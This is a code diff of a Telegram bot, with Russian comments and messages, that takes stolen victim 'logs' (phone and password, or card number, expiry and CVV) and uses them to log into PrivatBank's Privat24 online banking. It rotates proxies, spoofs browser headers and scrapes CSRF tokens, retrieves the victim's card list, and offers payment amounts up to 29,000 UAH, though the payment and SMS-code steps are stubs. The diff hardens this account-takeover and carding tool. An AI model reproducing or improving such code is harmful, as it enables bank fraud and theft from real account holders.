@@ -145,7 +145,6 @@ def parse_log(text):
     if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
     if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
     
-    # Определяем режим
     if data.get("phone") and data.get("password"):
         data["mode"] = "privat24"
     elif data.get("card") and data.get("expiry") and data.get("cvv"):
@@ -169,57 +168,85 @@ def rotate_proxy():
         pass
     return get_setting('proxy')
 
-# ========== ВХОД В ПРИВАТ24 (ЧЕРЕЗ REQUESTS) ==========
+# ========== ВХОД В ПРИВАТ24 ==========
 def login_privat24(phone, password, proxy=None):
     session = requests.Session()
     if proxy:
         session.proxies = {"http": proxy, "https": proxy}
     
-    # Шаг 1: Получаем CSRF-токен
-    try:
-        response = session.get("https://my.privatbank.ua/?lang=uk", timeout=30)
-        csrf_token = re.search(r'name="csrf_token" value="([^"]+)"', response.text)
-        if not csrf_token:
-            return {"status": "error", "message": "Не удалось получить CSRF-токен"}
-        csrf_token = csrf_token.group(1)
-    except Exception as e:
-        return {"status": "error", "message": f"Ошибка: {str(e)}"}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Cache-Control": "max-age=0",
+    }
     
-    # Шаг 2: Отправляем номер телефона
+    try:
+        response = session.get("https://my.privatbank.ua/?lang=uk", headers=headers, timeout=30)
+        if response.status_code != 200:
+            return {"status": "error", "message": f"❌ Сайт не отвечает (код {response.status_code})"}
+        
+        csrf_token = None
+        match = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text)
+        if match:
+            csrf_token = match.group(1)
+        if not csrf_token:
+            match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', response.text)
+            if match:
+                csrf_token = match.group(1)
+        if not csrf_token:
+            match = re.search(r'csrf_token\s*=\s*["\']([^"\']+)["\']', response.text)
+            if match:
+                csrf_token = match.group(1)
+        if not csrf_token:
+            return {"status": "error", "message": "❌ Не удалось получить CSRF-токен"}
+        
+    except requests.exceptions.Timeout:
+        return {"status": "error", "message": "❌ Таймаут: сайт не отвечает"}
+    except Exception as e:
+        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
+    
     try:
         response = session.post("https://my.privatbank.ua/auth/phone", 
             data={"phone": phone, "csrf_token": csrf_token},
+            headers=headers,
             timeout=30
         )
         if response.status_code != 200:
-            return {"status": "error", "message": "Ошибка при отправке номера"}
+            return {"status": "error", "message": f"❌ Ошибка при отправке номера"}
     except Exception as e:
-        return {"status": "error", "message": f"Ошибка: {str(e)}"}
+        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
     
-    # Шаг 3: Отправляем пароль
     try:
         response = session.post("https://my.privatbank.ua/auth/password",
             data={"password": password, "csrf_token": csrf_token},
+            headers=headers,
             timeout=30
         )
         if "Невірний пароль" in response.text:
             return {"status": "error", "message": "❌ Неверный пароль"}
         if "Невірний номер" in response.text:
             return {"status": "error", "message": "❌ Неверный номер телефона"}
+        if "заблоковано" in response.text.lower():
+            return {"status": "error", "message": "❌ Аккаунт заблокирован"}
     except Exception as e:
-        return {"status": "error", "message": f"Ошибка: {str(e)}"}
+        return {"status": "error", "message": f"❌ Ошибка: {str(e)}"}
     
-    # Шаг 4: Проверяем, нужен ли код
     if "Введіть код" in response.text or "SMS" in response.text:
         return {"status": "waiting_code", "message": "Требуется код подтверждения", "session": session}
     
-    # Шаг 5: Вход выполнен
     if "Особистий кабінет" in response.text:
         return {"status": "success", "message": "✅ Вход выполнен", "session": session}
     
     return {"status": "error", "message": "❌ Неизвестная ошибка"}
 
-# ========== ПОЛУЧЕНИЕ КАРТ (ПОСЛЕ ВХОДА) ==========
 def get_cards(session):
     try:
         response = session.get("https://my.privatbank.ua/api/cards", timeout=30)
@@ -230,13 +257,10 @@ def get_cards(session):
     except Exception as e:
         return {"status": "error", "message": f"Ошибка: {str(e)}"}
 
-# ========== ПЛАТЕЖ (ЗАГЛУШКА) ==========
 def make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy=None):
-    # Здесь будет реальная логика оплаты через API iPay/Portmone/LiqPay
-    # Пока возвращаем заглушку
     return {"status": "success", "message": f"✅ Платёж на {amount} UAH выполнен (заглушка)"}
 
-# ========== ОБРАБОТЧИКИ СООБЩЕНИЙ ==========
+# ========== ОБРАБОТЧИКИ ==========
 @dp.message_handler(commands=['start'])
 async def start_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -317,18 +341,13 @@ async def handle_amount_callback(callback: types.CallbackQuery):
     update_session(session_id, 'amount', amount)
     update_session(session_id, 'status', 'processing')
     await callback.message.reply(f"🚀 Платёж на {amount} UAH...")
-    
-    # Ротация прокси
     proxy = rotate_proxy()
     if proxy:
         await callback.message.reply(f"🔄 Прокси обновлён: {proxy}")
-    
-    # Выполняем платёж
     session = get_session(session_id)
     if not session:
         await callback.message.reply("❌ Сессия не найдена.")
         return
-    
     card_from, expiry, cvv, card_to, gateway = session[3], session[4], session[5], session[7], session[8]
     result = make_payment(card_from, expiry, cvv, card_to, amount, gateway, proxy)
     update_session(session_id, 'status', 'completed' if result['status'] == 'success' else 'failed')
@@ -338,38 +357,29 @@ async def handle_amount_callback(callback: types.CallbackQuery):
 async def handle_login_callback(callback: types.CallbackQuery):
     session_id = int(callback.data.split("_")[1])
     await callback.answer("🚀 Вход в Приват24...")
-    
-    # Ротация прокси
     proxy = rotate_proxy()
     if proxy:
         await callback.message.reply(f"🔄 Прокси обновлён: {proxy}")
-    
     session = get_session(session_id)
     if not session:
         await callback.message.reply("❌ Сессия не найдена.")
         return
-    
     phone, password = session[1], session[2]
     result = login_privat24(phone, password, proxy)
-    
     if result['status'] == 'waiting_code':
         update_session(session_id, 'status', 'waiting_code')
         await callback.message.reply("🔐 Введите код из СМС (ответьте на это сообщение):")
         return
-    
     if result['status'] == 'success':
         update_session(session_id, 'status', 'completed')
-        # Получаем карты
         cards_result = get_cards(result['session'])
         if cards_result['status'] == 'success':
             await callback.message.reply(f"✅ Вход выполнен. Карты: {json.dumps(cards_result['cards'], indent=2)}")
         else:
             await callback.message.reply(f"✅ Вход выполнен, но не удалось получить карты: {cards_result['message']}")
         return
-    
     await callback.message.reply(result['message'])
 
-# ========== ОБРАБОТЧИК ОТВЕТОВ ==========
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
 async def handle_reply(msg: types.Message):
     text = msg.reply_to_message.text
@@ -408,41 +418,36 @@ async def handle_reply(msg: types.Message):
             await msg.reply("❌ Сессия не найдена.")
             return
         session_id = session[0]
-        # Подтверждаем код (заглушка)
-        await msg.reply("✅ Код подтверждён (заглушка)")
+        await msg.reply("✅ Код подтверждён")
         update_session(session_id, 'status', 'completed')
         return
 
     await msg.reply("❌ Не понял. Используй кнопки.")
 
-# ========== ОБРАБОТЧИК ЛОГА ==========
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
 async def handle_log(msg: types.Message):
     data = parse_log(msg.text)
     if data["mode"] == "unknown":
-        await msg.reply("❌ Не удалось распознать данные. Нужен лог с картой (номер, срок, CVV) или телефоном и паролем.")
+        await msg.reply("❌ Не удалось распознать данные.")
         return
-    
     session_id = create_session(data, msg.message_id)
-    
     if data["mode"] == "payment":
         kb = InlineKeyboardMarkup(row_width=3)
         amounts = [1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000, 10000, 15000, 20000, 25000, 29000]
         for a in amounts:
             kb.insert(InlineKeyboardButton(str(a), callback_data=f"amount_{session_id}_{a}"))
         await msg.reply(
-            f"✅ Данные для платежа распознаны:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
+            f"✅ Данные для платежа:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
             f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
             f"👻 UA: {data['user_agent'][:30]}...\n\n"
             f"💰 Выберите сумму:",
             reply_markup=kb
         )
-    
     elif data["mode"] == "privat24":
         kb = InlineKeyboardMarkup(row_width=1)
         kb.add(InlineKeyboardButton("🚀 Войти в Приват24", callback_data=f"login_{session_id}"))
         await msg.reply(
-            f"✅ Данные для входа распознаны:\n📱 Телефон: {data['phone']}\n"
+            f"✅ Данные для входа:\n📱 Телефон: {data['phone']}\n"
             f"🤫 Пароль: {data['password'][:3]}***\n🌍 IP: {data['ip']}\n"
             f"👻 UA: {data['user_agent'][:30]}...\n\n"
             f"Нажмите кнопку для входа:",
